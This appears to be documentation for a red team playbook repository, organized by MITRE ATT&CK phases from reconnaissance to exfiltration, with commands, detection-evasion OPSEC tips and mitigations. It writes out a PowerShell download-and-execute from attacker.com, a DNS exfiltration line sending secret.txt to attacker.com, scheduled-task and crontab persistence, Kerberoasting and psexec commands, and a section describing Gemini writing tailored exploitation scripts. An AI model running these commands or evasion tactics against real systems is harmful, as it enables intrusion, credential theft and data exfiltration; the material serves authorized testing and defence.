docs.title: Red Team Playbook
docs.text: A comprehensive collection of Red Teaming Tactics, Techniques, and Procedures (TTPs) mapped to the MITRE ATT&CK framework. This repository serves as a living document for security researchers and authorized red team operators.

docs.title: 🛠️ How to Use
docs.text: This playbook is organized by attack phases. Each category contains Markdown files detailing specific techniques, commands, and OPSEC considerations.

docs.title: Example Usage:
docs.text:
• Navigate to a phase (e.g., 05-Privilege-Escalation).
  • Read the relevant technique (e.g., Windows-PrivEsc.md).
  • Follow the methodology and adapt the commands to your target environment.

docs.title: 🤝 Contributing
docs.text: Contributions are welcome for educational, defensive, and authorized security research content. Please read the contribution guide before opening an issue or pull request.

docs.title: Overview
docs.text:
This repository contains a comprehensive collection of Red Teaming Tactics, Techniques, and Procedures (TTPs) mapped to the MITRE ATT&CK framework. It is designed as a living document for security researchers and authorized red team operators.

Disclaimer: All techniques are strictly for educational and authorized security testing purposes.

docs.title: Repository Structure
docs.text: The playbook is systematically organized by attack phases: - 01-Reconnaissance: E.g., Passive Recon using WHOIS, Google Dorks, and Subdomain Enumeration. - 02-Initial-Access - 03-Execution - 04-Persistence - 05-Privilege-Escalation: E.g., Linux PrivEsc techniques like SUID binaries, Sudo permissions, and Cron jobs. - 06-Defense-Evasion - 07-Credential-Access: E.g., Kerberoasting via Impacket or Rubeus. - 08-Discovery - 09-Lateral-Movement - 10-Exfiltration

docs.title: Key Themes & OPSEC
docs.text: Across the documentation, there is a strong emphasis on Operational Security (OPSEC): - Passive Recon: Emphasizes no direct target interaction and VPN/Tor usage. - Privilege Escalation: Advises piping tools into bash rather than writing to disk and cleaning up /tmp. - Credential Access: Warns about Event ID 4769 during Kerberoasting and suggests targeting specific SPNs.

docs.title: How Gemini Can Help
docs.text: As an AI assistant, Gemini can help operators utilizing this playbook by: 1. Generating Custom Scripts: Writing specific enumeration or exploitation scripts tailored to a target environment. 2. Explaining Output: Analyzing the output of tools like linpeas.sh, lse.sh, or domain enumeration. 3. Drafting Reports: Assisting in documenting findings, writing executive summaries, and formulating mitigation strategies based on the TTPs executed. 4. Command Syntax: Providing quick syntax reminders for tools like hashcat, impacket, and jq.

docs.title: Overview
docs.text: Reconnaissance is the phase where an attacker gathers information about a target. This can be done passively or actively.

docs.title: Techniques
docs.text: • Passive Reconnaissance

docs.title: Overview
docs.text: Passive reconnaissance involves gathering information about a target without directly interacting with their infrastructure. This minimizes the risk of detection.

docs.title: 1. WHOIS Enumeration
docs.text:
Used to find domain registration details and contact information. 

whois example.com

docs.title: 2. Search Engine Dorking (Google Dorks)
docs.text: Find exposed sensitive files or login portals. - site:target.com filetype:pdf - site:target.com inurl:login - site:target.com "index of /"

docs.title: 3. Subdomain Enumeration (Passive)
docs.text:
Using third-party services like Sublist3r or crt.sh. 

# Using crt.sh
curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

docs.title: OPSEC Considerations
docs.text:
• Truly passive - the target sees no traffic.
  • Use a VPN or Tor when performing these searches to protect your source IP.

docs.title: Overview
docs.text: Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network.

docs.title: Techniques
docs.text: • Phishing

docs.title: Overview
docs.text: Phishing is the practice of sending fraudulent communications that appear to come from a reputable source, usually through email. The goal is to steal sensitive data like login credentials or to install malware on the victim's machine.

docs.title: 1. Spearphishing Attachment (T1566.001)
docs.text: Sending an email with a malicious attachment (e.g., .xlsm, .zip, .pdf). * Tooling: Gophish, Evilginx2. * Payloads: Macro-enabled documents, LNK files.

docs.title: 2. Spearphishing Link (T1566.002)
docs.text: Sending an email with a link to a malicious website or a credential harvesting page. * Credential Harvesting: Cloning a login page using httrack or Social-Engineer Toolkit (SET).

docs.title: OPSEC Considerations
docs.text:
• Domain Age: Use domains that have been registered for at least 30 days.
  • SMTP Reputation: Ensure the mail server has proper SPF, DKIM, and DMARC records to avoid spam filters.
  • Tracking Pixels: Use sparingly as they can be detected by modern mail gateways.

docs.title: Mitigations
docs.text:
• User awareness training.
  • Multi-Factor Authentication (MFA).
  • Email filtering and sandboxing solutions.

docs.title: Overview
docs.text: Execution consists of techniques that result in adversary-controlled code running on a local or remote system.

docs.title: Techniques
docs.text: • PowerShell Execution

docs.title: Overview
docs.text: PowerShell is a powerful scripting language and shell that is widely used by administrators. Red teams use it for execution, discovery, and post-exploitation.

docs.title: Download and Execute (In-Memory)
docs.text: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

docs.title: Base64 Encoded Command
docs.text:
Avoids simple string-based detection. 

echo "Write-Host 'Hello from PowerShell'" | iconv -t utf16le | base64 -w0
# Output: VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAZgByAG8AbQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAJwAK
powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAZgByAG8AbQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAJwAK

docs.title: OPSEC Considerations
docs.text:
• Script Block Logging (Event ID 4104): Records the full content of scripts.
  • AMSI (Antimalware Scan Interface): Scans scripts before execution. Use AMSI bypasses if necessary.
  • Constrained Language Mode (CLM): Limits the functionality of PowerShell.

docs.title: Mitigations
docs.text:
• Enable Constrained Language Mode via AppLocker or Device Guard.
  • Monitor Event IDs 4104 (Script Block Logging) and 4103 (Module Logging).
  • Disable PowerShell v2 to prevent version downgrade attacks.

docs.title: Overview
docs.text: Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

docs.title: Techniques
docs.text: • Scheduled Tasks

docs.title: Overview
docs.text: Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.

docs.title: Windows (schtasks)
docs.text: Creating a scheduled task to execute a payload on user logon or at regular intervals.

docs.title: Create Task via Command Line
docs.text: schtasks /create /tn "UpdaterService" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru System

docs.title: Linux (cron)
docs.text: Adding entries to crontab to execute scripts periodically.

docs.title: Crontab Entry
docs.text: echo "* * * * * /tmp/payload.sh" >> /etc/crontab

docs.title: OPSEC Considerations
docs.text:
• Avoid obvious task names. Blend in with legitimate tasks (e.g., GoogleUpdateTaskMachineUA, Adobe Acrobat Update Task).
  • Scheduled tasks created by adversaries may generate Event ID 4698 (A scheduled task was created).
  • Ensure payload execution does not spawn visible windows to the user.

docs.title: Mitigations
docs.text:
• Monitor for Event ID 4698.
  • Restrict the ability of users to create scheduled tasks.
  • Regularly audit scheduled tasks and crontab entries.

docs.title: Overview
docs.text: Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.

docs.title: Techniques
docs.text:
• Linux Privilege Escalation
  • Windows Privilege Escalation

docs.title: Overview
docs.text: Techniques to escalate from a low-privileged user to root.

docs.title: Enumeration Tools
docs.text:
• LinPeas: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  • lse.sh: curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | sh

docs.title: 1. SUID Binaries
docs.text:
Find binaries with the SUID bit set. 

find / -perm -u=s -type f 2>/dev/null
Check GTFOBins for exploitation vectors.

docs.title: 2. Sudo Permissions
docs.text:
Check what the current user can run with sudo. 

sudo -l

docs.title: 3. Cron Jobs
docs.text:
Look for writable scripts executed by root. 

cat /etc/crontab
ls -la /etc/cron.*

docs.title: OPSEC Considerations
docs.text:
• Avoid downloading tools directly to disk; try to pipe them into bash if possible.
  • Clean up any temporary files created in /tmp.

docs.title: Overview
docs.text: Techniques to escalate from a low-privileged user to NT AUTHORITY\SYSTEM or a Domain Admin.

docs.title: Enumeration Tools
docs.text:
• WinPEAS: .\winPEASany.exe
  • PrivescCheck: `PowerShell -ep bypass -c ". \PrivescCheck.ps1; Invoke-PrivescCheck"

docs.title: 1. Unquoted Service Paths
docs.text:
Services where the executable path contains spaces and is not enclosed in quotes. 

wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v ""

docs.title: 2. Token Manipulation (Incognito)
docs.text:
Abusing tokens of logged-in users. 

# Using meterpreter
use incognito
list_tokens -u
impersonate_token "DOMAIN\Administrator"

docs.title: 3. AlwaysInstallElevated
docs.text:
Check if the registry keys are set to allow any user to install MSI files with elevated privileges. 

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

docs.title: OPSEC Considerations
docs.text:
• Avoid running heavy scanners if possible; use manual enumeration first.
  • Be careful with service modifications as they can crash the system.

docs.title: Mitigations
docs.text:
• Ensure all service paths are properly quoted.
  • Disable AlwaysInstallElevated registry settings.
  • Implement the Principle of Least Privilege (PoLP).

docs.title: Overview
docs.text: Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.

docs.title: Techniques
docs.text: • Process Injection

docs.title: Overview
docs.text: Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.

docs.title: 1. DLL Injection (T1055.001)
docs.text: Injecting a malicious DLL into a target process. * Using CreateRemoteThread and LoadLibrary API calls. * Often requires a custom loader or tools like Metasploit/Cobalt Strike.

docs.title: 2. Process Hollowing (T1055.012)
docs.text: Starting a process in a suspended state, unmapping its legitimate code, and replacing it with malicious code before resuming the thread.

docs.title: OPSEC Considerations
docs.text:
• Injecting into highly monitored processes (e.g., lsass.exe, explorer.exe) can trigger EDR alerts.
  • Choose target processes that blend in with normal system activity (e.g., svchost.exe, notepad.exe, browser processes).
  • Cross-session injection is often flagged.

docs.title: Mitigations
docs.text:
• Endpoint Detection and Response (EDR) solutions are the primary defense, monitoring API calls related to memory allocation and thread creation.
  • Ensure Antivirus is running and updated.

docs.title: Overview
docs.text: Credential Access consists of techniques for stealing credentials like account names and passwords.

docs.title: Techniques
docs.text: • Kerberoasting

docs.title: Overview
docs.text: Requesting service tickets (TGS) for service accounts and cracking the hashes offline to obtain the account's password.

docs.title: Linux (Impacket)
docs.text: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>

docs.title: Windows (Rubeus)
docs.text: .\Rubeus.exe kerberoast /outfile:hashes.txt

docs.title: Cracking (Hashcat)
docs.text: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: OPSEC Considerations
docs.text:
• Large numbers of TGS requests can trigger alerts (Event ID 4769).
  • Target specific Service Principal Names (SPNs) rather than all of them.

docs.title: Overview
docs.text: Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.

docs.title: Techniques
docs.text: • Local Network Discovery

docs.title: Overview
docs.text: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement.

docs.title: 1. Ping Sweeps
docs.text:
Simple ICMP echo requests to discover live hosts. 

# Linux
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "bytes from" & done

# Windows
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "Reply"

docs.title: 2. ARP Scanning
docs.text:
More reliable on local subnets as it uses Layer 2 and isn't blocked by host firewalls. 

arp-scan --localnet

docs.title: 3. Port Scanning
docs.text:
Using tools like nmap to discover open ports and services on discovered hosts. 

nmap -sn 192.168.1.0/24

docs.title: OPSEC Considerations
docs.text:
• Active scanning is noisy and easily detected by Network Intrusion Detection Systems (NIDS).
  • Use passive discovery methods where possible (e.g., listening to ARP broadcasts, analyzing local routing tables, or querying Active Directory).

docs.title: Mitigations
docs.text:
• Network segmentation to limit the scope of discovery.
  • NIDS to detect abnormal scanning behavior.

docs.title: Overview
docs.text: Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network.

docs.title: Techniques
docs.text: • SMB Admin Shares

docs.title: Overview
docs.text: Adversaries may use valid accounts with administrative privileges to move laterally within a network using Windows Admin Shares (e.g., C$, ADMIN$).

docs.title: 1. Mounting a Share
docs.text: net use Z: \\Target-PC\C$ /user:DOMAIN\Username Password

docs.title: 2. Impacket (psexec.py)
docs.text:
A common red team tool to gain a shell on a remote system via SMB and the ADMIN$ share. 

impacket-psexec DOMAIN/Username:Password@Target-IP

docs.title: OPSEC Considerations
docs.text:
• Successful and failed logins are logged (Event IDs 4624, 4625).
  • Using psexec creates a service on the target machine, which is highly visible to EDRs.

docs.title: Mitigations
docs.text:
• Disable Administrative Shares if not required.
  • Restrict local administrator privileges.
  • Monitor for Event ID 4624 with logon type 3 (Network).

docs.title: Overview
docs.text: Exfiltration consists of techniques that adversaries may use to steal data from your network.

docs.title: Techniques
docs.text: • Alternative Protocols (DNS/ICMP)

docs.title: Overview
docs.text: Adversaries may steal data by transferring it over a different protocol than the one used for command and control.

docs.title: 1. DNS Exfiltration (T1048.003)
docs.text:
Encoding data into subdomains of DNS queries sent to an attacker-controlled DNS server. 

# Example: Sending a base64 encoded string as a subdomain
data=$(cat secret.txt | base64 | tr -d '\n')
nslookup ${data}.attacker.com

docs.title: 2. ICMP Exfiltration
docs.text: Hiding data within the data field of ICMP Echo Request (ping) packets. * Tool: icmpsh, ptunnel.

docs.title: OPSEC Considerations
docs.text:
• DNS exfiltration is slow and creates a massive number of DNS requests, which can be easily detected by traffic analysis.
  • ICMP exfiltration requires certain firewall rules to be in place.

docs.title: Mitigations
docs.text:
• Monitor for unusual DNS query patterns and high volumes of DNS traffic to unknown domains.
  • Implement Deep Packet Inspection (DPI) to identify non-standard data within protocols.
